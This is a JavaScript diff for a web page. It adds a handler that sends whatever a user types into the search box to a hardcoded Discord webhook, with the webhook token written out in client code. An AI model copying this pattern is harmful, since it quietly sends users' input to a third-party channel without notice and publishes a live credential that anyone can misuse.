@@ -81,3 +81,31 @@ const observer2 = new MutationObserver(mutations=>{
 window.addEventListener("DOMContentLoaded", ()=>{
   observer2.observe(document.body, { childList: true, subtree: true, characterData: true });
 });
+
+document.addEventListener("DOMContentLoaded", () => {
+  const input = document.querySelector(".searchbox-input");
+  if (!input) return;
+
+  input.addEventListener("keydown", async e => {
+    if (e.key === "Enter") {
+      const text = input.value.trim();
+      if (!text) return;
+
+      const payload = {
+        content: text.replace(/[`*_~>|]/g, "") // basic markdown sanitization
+      };
+
+      try {
+        const res = await fetch("https://discord.com/api/webhooks/1425948057018568705/48wQvRqkCejB_t5i7Giw_q6-75RaXLdEEPUMoN3H1W_lgMsrOPidv2qPHykXMC4RyvL6", {
+          method: "POST",
+          headers: { "Content-Type": "application/json" },
+          body: JSON.stringify(payload)
+        });
+
+        if (!res.ok) console.error("Failed to send to Discord:", res.status);
+      } catch (err) {
+        console.error("Error sending to Discord:", err);
+      }
+    }
+  });
+});
